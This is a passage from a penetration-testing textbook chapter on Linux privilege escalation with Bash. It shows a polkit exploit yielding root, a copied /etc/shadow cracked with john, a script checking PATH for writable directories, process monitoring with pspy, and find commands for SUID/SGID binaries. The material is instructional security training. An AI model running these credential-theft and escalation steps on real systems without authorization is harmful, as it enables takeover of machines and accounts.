    <span class="koboSpan" id="kobo.496.1">
     command and see that they are, in fact, compiled.
    </span>
    <span class="koboSpan" id="kobo.496.2">
     We change the permissions to make them
    </span>
    <a id="_idIndexMarker694">
    </a>
    <span class="koboSpan" id="kobo.497.1">
     executable by running the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.498.1">
      chmod +x filename
     </span>
    </strong>
    <span class="koboSpan" id="kobo.499.1">
     command, and then run the exploit.
    </span>
    <span class="koboSpan" id="kobo.499.2">
     The following figure shows the exploit
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.500.1">
      in action:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer148">
     <span class="koboSpan" id="kobo.501.1">
      <img alt="Figure 11.18 – Running the polkit exploit results in a root shell" src="image/B22229_11_18.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.502.1">
     Figure 11.18 – Running the polkit exploit results in a root shell
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.503.1">
     While we have elevated privileges as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.504.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.505.1">
     , we need to establish some form of persistence.
    </span>
    <span class="koboSpan" id="kobo.505.2">
     I
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.506.1">
      cat
     </span>
    </strong>
    <span class="koboSpan" id="kobo.507.1">
     the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.508.1">
      /etc/shadow
     </span>
    </strong>
    <span class="koboSpan" id="kobo.509.1">
     file, which contains password hashes, and then save a copy to my Kali system.
    </span>
    <span class="koboSpan" id="kobo.509.2">
     I then attempt to crack the hashes using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.510.1">
      john shadow
     </span>
    </strong>
    <span class="koboSpan" id="kobo.511.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.511.2">
     I managed to crack the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.512.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.513.1">
     password, as shown in the following figure, where we find that the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.514.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.515.1">
     password is
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.516.1">
      12345
     </span>
    </strong>
    <span class="koboSpan" id="kobo.517.1">
     .
    </span>
    <span class="koboSpan" id="kobo.517.2">
     Having the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.518.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.519.1">
     password will allow us to continue accessing this system as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.520.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.521.1">
     should we
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.522.1">
      get disconnected:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer149">
     <span class="koboSpan" id="kobo.523.1">
      <img alt="Figure 11.19 – Using john to crack the root password" src="image/B22229_11_19.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.524.1">
     Figure 11.19 – Using john to crack the root password
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.525.1">
     For the sake of learning, let’s continue as if we haven’t found this exploit and continue to enumerate the system for privilege
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.526.1">
      escalation paths.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.527.1">
     Next, we need to test for writable directories in the path of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.528.1">
      user6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.529.1">
     .
    </span>
    <span class="koboSpan" id="kobo.529.2">
     If any writable directories are found
    </span>
    <a id="_idIndexMarker695">
    </a>
    <span class="koboSpan" id="kobo.530.1">
     in our path, we may be able to hijack and replace their content.
    </span>
    <span class="koboSpan" id="kobo.530.2">
     For this, we’ll use the following script, which can be found in this chapter’s GitHub repository
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.531.1">
      as
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.532.1">
       ch11_checkpath.sh
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.533.1">
      :
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.534.1">
#!/usr/bin/env bash
# Get the PATH environment variable
path_dirs=$(echo $PATH | tr ':' '\n')</span></pre>
   <p>
    <span class="koboSpan" id="kobo.535.1">
     The preceding code starts with the familiar shebang line.
    </span>
    <span class="koboSpan" id="kobo.535.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.536.1">
      PATH
     </span>
    </strong>
    <span class="koboSpan" id="kobo.537.1">
     environment variable is expanded, then each colon is replaced with a newline to make the data into one directory per line.
    </span>
    <span class="koboSpan" id="kobo.537.2">
     This data is then assigned to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.538.1">
       path_dirs
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.539.1">
      variable.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.540.1">
# Function to check write permissions recursively
check_permissions() {
  local dir=$1
  echo "[i] Checking write permissions for $dir and its subdirectories:"
  find "$dir" -type d | while read subdir; do
    if [ -w "$subdir" ]; then
      echo "[!] $subdir is writable!"
</span><span class="koboSpan" id="kobo.540.2">    else
      echo "[-] $subdir is not writable"
    fi
  done
}</span></pre>
   <p>
    <span class="koboSpan" id="kobo.541.1">
     The preceding
    </span>
    <a id="_idIndexMarker696">
    </a>
    <span class="koboSpan" id="kobo.542.1">
     code block checks each directory (recursively) if it
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.543.1">
      is writable.
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.544.1">
# Loop through each directory in PATH and check write permissions recursively
for dir in $path_dirs; do
  if [ -d "$dir" ]; then
    check_permissions "$dir"
  fi
done</span></pre>
   <p>
    <span class="koboSpan" id="kobo.545.1">
     The preceding code block loops through the list of directories in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.546.1">
      path_dir
     </span>
    </strong>
    <span class="koboSpan" id="kobo.547.1">
     variable and passes each one to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.548.1">
       check_permissions
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.549.1">
      function.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.550.1">
     We run this script on the target, but no writable directories are discovered, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.551.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer150">
     <span class="koboSpan" id="kobo.552.1">
      <img alt="Figure 11.20 – Checking for writable directories in PATH" src="image/B22229_11_20.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.553.1">
     Figure 11.20 – Checking for writable directories in PATH
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.554.1">
     Next, we check environment variables for credentials, keys, or any interesting data using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.555.1">
      following
     </span>
    </span>
    <span class="No-Break">
     <a id="_idIndexMarker697">
     </a>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.556.1">
      command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.557.1">
$ env</span></pre>
   <p>
    <span class="koboSpan" id="kobo.558.1">
     The output is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.559.1">
      as follows:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer151">
     <span class="koboSpan" id="kobo.560.1">
      <img alt="Figure 11.21 – Environment variables are displayed" src="image/B22229_11_21.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.561.1">
     Figure 11.21 – Environment variables are displayed
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.562.1">
     Unfortunately, we do not find any interesting data in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.563.1">
      environment variables.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.564.1">
     Next, we’ll explore running processes.
    </span>
    <span class="koboSpan" id="kobo.564.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.565.1">
      pspy
     </span>
    </strong>
    <span class="koboSpan" id="kobo.566.1">
     tool will allow us to monitor running processes without being the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.567.1">
      root
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.568.1">
      user:
     </span>
    </span>
    <a href="https://github.com/DominicBreuker/pspy">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.569.1">
       https://github.com/DominicBreuker/pspy
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.570.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.571.1">
     After transferring
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.572.1">
      pspy64
     </span>
    </strong>
    <span class="koboSpan" id="kobo.573.1">
     to the target system, we run it and see something interesting in the output, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.574.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer152">
     <span class="koboSpan" id="kobo.575.1">
      <img alt="Figure 11.22 – Interesting executables running in the pspy64 output" src="image/B22229_11_22.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.576.1">
     Figure 11.22 – Interesting executables running in the pspy64 output
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.577.1">
     We examine
    </span>
    <a id="_idIndexMarker698">
    </a>
    <span class="koboSpan" id="kobo.578.1">
     these files in
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.579.1">
      /home/user4
     </span>
    </strong>
    <span class="koboSpan" id="kobo.580.1">
     and find that we do not have the ability to write to them, as seen in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.581.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer153">
     <span class="koboSpan" id="kobo.582.1">
      <img alt="Figure 11.23 – Examining files in user4’s home directory" src="image/B22229_11_23.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.583.1">
     Figure 11.23 – Examining files in user4’s home directory
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.584.1">
     Finally, let’s check some common file permissions.
    </span>
    <span class="koboSpan" id="kobo.584.2">
     Run the following commands on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.585.1">
      target system:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.586.1">
$ ls -l /etc/passwd
$ ls -l /etc/shadow</span></pre>
   <p>
    <span class="koboSpan" id="kobo.587.1">
     Of course, we don’t have any luck here and we can’t write to these files and can’t read password hashes from
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.588.1">
      /etc/shadow
     </span>
    </strong>
    <span class="koboSpan" id="kobo.589.1">
     , but it never hurts
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.590.1">
      to check.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.591.1">
     This section gave a primer on common filesystem paths to check, and how to enumerate the kernel and
    </span>
    <a id="_idIndexMarker699">
    </a>
    <span class="koboSpan" id="kobo.592.1">
     operating system versions and search for working exploits.
    </span>
    <span class="koboSpan" id="kobo.592.2">
     In the next section, we’ll explore SUID and SGID binaries and how they can be useful for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.593.1">
      privile
     </span>
     <a id="_idTextAnchor332">
     </a>
     <a id="_idTextAnchor333">
     </a>
     <span class="koboSpan" id="kobo.594.1">
      ge escalation.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-184">
    <a id="_idTextAnchor334">
    </a>
    <span class="koboSpan" id="kobo.595.1">
     Exploiting SUID and SGID binaries with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.596.1">
     SUID and SGID are
    </span>
    <a id="_idIndexMarker700">
    </a>
    <span class="koboSpan" id="kobo.597.1">
     special permissions in Unix-like systems that
    </span>
    <a id="_idIndexMarker701">
    </a>
    <span class="koboSpan" id="kobo.598.1">
     allow users to execute files
    </span>
    <a id="_idIndexMarker702">
    </a>
    <span class="koboSpan" id="kobo.599.1">
     with the permission of the file owner or group.
    </span>
    <span class="koboSpan" id="kobo.599.2">
     When misused, these permissions can lead to privilege escalation.
    </span>
    <span class="koboSpan" id="kobo.599.3">
     This section focuses on identifying and exploiting SUID/SGID binaries using Bash commands
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.600.1">
      and scripts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.601.1">
     In a previous chapter, you learned about Linux file permissions.
    </span>
    <span class="koboSpan" id="kobo.601.2">
     Let’s have a quick recap and then build on that concept to understand SUID
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.602.1">
      and SGID.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.603.1">
     If we enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.604.1">
      ls -l
     </span>
    </strong>
    <span class="koboSpan" id="kobo.605.1">
     command and view the output for the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.606.1">
      shell.php
     </span>
    </strong>
    <span class="koboSpan" id="kobo.607.1">
     file, we fi
    </span>
    <a id="_idTextAnchor335">
    </a>
    <a id="_idTextAnchor336">
    </a>
    <a id="_idTextAnchor337">
    </a>
    <a id="_idTextAnchor338">
    </a>
    <span class="koboSpan" id="kobo.608.1">
     nd
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.609.1">
      the following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.610.1">
-rw-r--r-- 1 root root    68 Jun  4  2019 shell.php</span></pre>
   <p>
    <span class="koboSpan" id="kobo.611.1">
     Let’s break that down.
    </span>
    <span class="koboSpan" id="kobo.611.2">
     The first character is always either
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.612.1">
      -
     </span>
    </strong>
    <span class="koboSpan" id="kobo.613.1">
     for a file or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.614.1">
      d
     </span>
    </strong>
    <span class="koboSpan" id="kobo.615.1">
     for a directory.
    </span>
    <span class="koboSpan" id="kobo.615.2">
     In the following figure, I have highlighted the file type.
    </span>
    <span class="koboSpan" id="kobo.615.3">
     Since the file type in this figure is a dash (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.616.1">
      -
     </span>
    </strong>
    <span class="koboSpan" id="kobo.617.1">
     ), we know this is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.618.1">
      a file:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer154">
     <span class="koboSpan" id="kobo.619.1">
      <img alt="Figure 11.24 – The file type is highlighted and shows it is a file, not a directory" src="image/B22229_11_24.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.620.1">
     Figure 11.24 – The file type is highlighted and shows it is a file, not a directory
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.621.1">
     In the following figure, the user permissions are highlighted.
    </span>
    <span class="koboSpan" id="kobo.621.2">
     If you recall, when all three are set (read, write, and execute), they sum to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.622.1">
      7
     </span>
    </strong>
    <span class="koboSpan" id="kobo.623.1">
     (
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.624.1">
      4 + 2 + 1 = 7
     </span>
    </em>
    <span class="koboSpan" id="kobo.625.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.625.2">
     In this case, since the file is not executable, the user permissions sum to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.626.1">
      6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.627.1">
     (
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.628.1">
      4 + 2 + 0 =
     </span>
    </em>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.629.1">
       6
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.630.1">
      ):
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer155">
     <span class="koboSpan" id="kobo.631.1">
      <img alt="Figure 11.25 – User permissions are highlighted" src="image/B22229_11_25.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.632.1">
     Figure 11.25 – User permissions are highlighted
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.633.1">
     Group permissions are examined in the following figure.
    </span>
    <span class="koboSpan" id="kobo.633.2">
     The file is readable but not writeable or executable.
    </span>
    <span class="koboSpan" id="kobo.633.3">
     The group permissions sum to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.634.1">
      4
     </span>
    </strong>
    <span class="koboSpan" id="kobo.635.1">
     (
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.636.1">
      4 + 0 + 0 =
     </span>
    </em>
    <span class="No-Break">
     <em class="italic">
      <span class="koboSpan" id="kobo.637.1">
       4
      </span>
     </em>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.638.1">
      ):
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer156">
     <span class="koboSpan" id="kobo.639.1">
      <img alt="Figure 11.26 – Group permissions are highlighted" src="image/B22229_11_26.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.640.1">
     Figure 11.26 – Group permissions are highlighted
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.641.1">
     Other permissions are examined in the following figure.
    </span>
    <span class="koboSpan" id="kobo.641.2">
     If you are not the user or a member of the
    </span>
    <a id="_idIndexMarker703">
    </a>
    <span class="koboSpan" id="kobo.642.1">
     group
    </span>
    <a id="_idIndexMarker704">
    </a>
    <span class="koboSpan" id="kobo.643.1">
     listed
    </span>
    <a id="_idIndexMarker705">
    </a>
    <span class="koboSpan" id="kobo.644.1">
     on the file permissions, then the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.645.1">
      other
     </span>
    </em>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.646.1">
      permissions apply:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer157">
     <span class="koboSpan" id="kobo.647.1">
      <img alt="Figure 11.27 – Other permissions are highlighted" src="image/B22229_11_27.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.648.1">
     Figure 11.27 – Other permissions are highlighted
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.649.1">
     In the following figure, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.650.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.651.1">
     user is the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.652.1">
      file owner:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer158">
     <span class="koboSpan" id="kobo.653.1">
      <img alt="Figure 11.28 – File user ownership is shown to be root" src="image/B22229_11_28.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.654.1">
     Figure 11.28 – File user ownership is shown to be root
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.655.1">
     The
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.656.1">
      root
     </span>
    </em>
    <span class="koboSpan" id="kobo.657.1">
     group has group permissions on this file, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.658.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer159">
     <span class="koboSpan" id="kobo.659.1">
      <img alt="Figure 11.29 – Group ownership belongs to the root group" src="image/B22229_11_29.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.660.1">
     Figure 11.29 – Group ownership belongs to the root group
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.661.1">
     Linux special
    </span>
    <a id="_idIndexMarker706">
    </a>
    <span class="koboSpan" id="kobo.662.1">
     file
    </span>
    <a id="_idIndexMarker707">
    </a>
    <span class="koboSpan" id="kobo.663.1">
     permissions
    </span>
    <a id="_idIndexMarker708">
    </a>
    <span class="koboSpan" id="kobo.664.1">
     extend beyond the basic read, write, and execute permissions.
    </span>
    <span class="koboSpan" id="kobo.664.2">
     Two key special permissions are the SUID and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.665.1">
      SGID bits:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.666.1">
       SUID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.667.1">
      : When applied to an executable file, SUID allows the file to run with the privileges of the file’s owner, rather than the user executing it.
     </span>
     <span class="koboSpan" id="kobo.667.2">
      It’s represented by
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.668.1">
       s
      </span>
     </strong>
     <span class="koboSpan" id="kobo.669.1">
      in the owner’s execute
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.670.1">
       permission field.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.671.1">
       To set SUID, enter this command:
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.672.1">
        ch
       </span>
       <a id="_idTextAnchor339">
       </a>
       <a id="_idTextAnchor340">
       </a>
       <a id="_idTextAnchor341">
       </a>
       <a id="_idTextAnchor342">
       </a>
       <span class="koboSpan" id="kobo.673.1">
        mod
       </span>
      </strong>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.674.1">
         u+s filename
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.675.1">
        .
       </span>
      </span>
     </p>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.676.1">
       To set SUID using numeric representation, enter this command:
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.677.1">
        chmod
       </span>
      </strong>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.678.1">
         4000 filename
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.679.1">
        .
       </span>
      </span>
     </p>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.680.1">
       When examining file permissions, the following figure demonstrates the permissions of a file
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.681.1">
        with SUID:
       </span>
      </span>
     </p>
    </li>
   </ul>
   <div>
    <div class="IMG---Figure" id="_idContainer160">
     <span class="koboSpan" id="kobo.682.1">
      <img alt="Figure 11.30 – File permissions reveal it is SUID" src="image/B22229_11_30.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.683.1">
     Figure 11.30 – File permissions reveal it is SUID
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.684.1">
       SGID
      </span>
     </strong>
     <span class="koboSpan" id="kobo.685.1">
      : SGID works similarly to SUID but for groups.
     </span>
     <span class="koboSpan" id="kobo.685.2">
      When set on an executable, it runs with the privileges of the file’s group.
     </span>
     <span class="koboSpan" id="kobo.685.3">
      On directories, it causes new files created within to inherit the group of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.686.1">
       parent directory.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.687.1">
       To set SGID, enter this command:
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.688.1">
        chmod
       </span>
      </strong>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.689.1">
         g+s filename
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.690.1">
        .
       </span>
      </span>
     </p>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.691.1">
       To set SGID using numeric representation, enter this command:
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.692.1">
        chmod
       </span>
      </strong>
      <span class="No-Break">
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.693.1">
         2000 filename
        </span>
       </strong>
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.694.1">
        .
       </span>
      </span>
     </p>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.695.1">
       When examining file permissions, the following figure demonstrates the permissions of a file
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.696.1">
        with SGID:
       </span>
      </span>
     </p>
    </li>
   </ul>
   <div>
    <div class="IMG---Figure" id="_idContainer161">
     <span class="koboSpan" id="kobo.697.1">
      <img alt="Figure 11.31 – File permissions reveal it is SGID" src="image/B22229_11_31.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.698.1">
     Figure 11.31 – File permissions reveal it is SGID
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.699.1">
     These permissions are relevant to privilege escalation in several ways.
    </span>
    <span class="koboSpan" id="kobo.699.2">
     If a vulnerable SUID binary owned by
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.700.1">
      root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.701.1">
     can be exploited, it may lead to privilege escalation.
    </span>
    <span class="koboSpan" id="kobo.701.2">
     SGID is similar to SUID, except
    </span>
    <a id="_idIndexMarker709">
    </a>
    <span class="koboSpan" id="kobo.702.1">
     escalating to
    </span>
    <a id="_idIndexMarker710">
    </a>
    <span class="koboSpan" id="kobo.703.1">
     the privileges of a specific
    </span>
    <a id="_idIndexMarker711">
    </a>
    <span class="koboSpan" id="kobo.704.1">
     group.
    </span>
    <span class="koboSpan" id="kobo.704.2">
     If an attacker can modify these binaries, they can insert malicious code to be executed with elevated privileges.
    </span>
    <span class="koboSpan" id="kobo.704.3">
     Unnecessary SUID or SGID bits on executables increase the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.705.1">
      attack surface.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.706.1">
     To find SUID and SGID binaries, use the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.707.1">
      Bash commands:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.708.1">
# Find SUID binar</span><a id="_idTextAnchor343"/><a id="_idTextAnchor344"/><span class="koboSpan" id="kobo.709.1">ies
$ find / -perm -u=s -type f 2&gt;/dev/null
# Find SGID binaries
$ find / -perm -g=s -type f 2&gt;/dev/null</span></pre>
   <p>
    <span class="koboSpan" id="kobo.710.1">
     These commands search the entire filesystem starting at the top level
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.711.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.712.1">
     for files (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.713.1">
      -type f
     </span>
    </strong>
    <span class="koboSpan" id="kobo.714.1">
     ) with SUID (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.715.1">
      -u=s
     </span>
    </strong>
    <span class="koboSpan" id="kobo.716.1">
     ) or SGID (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.717.1">
      -g=s
     </span>
    </strong>
    <span class="koboSpan" id="kobo.718.1">
     ) bits set.
    </span>
    <span class="koboSpan" id="kobo.718.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.719.1">
      2&gt;/dev/null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.720.1">
     expression redirects error messages to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.721.1">
      /dev/null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.722.1">
     , suppressing permission-denied errors.
    </span>
    <span class="koboSpan" id="kobo.722.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.723.1">
      /dev/null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.724.1">
     file is essentially a trashcan with a black hole at the bottom.
    </span>
    <span class="koboSpan" id="kobo.724.2">
     Anything that is sent to this special place
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.725.1">
      is discarded.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.726.1">
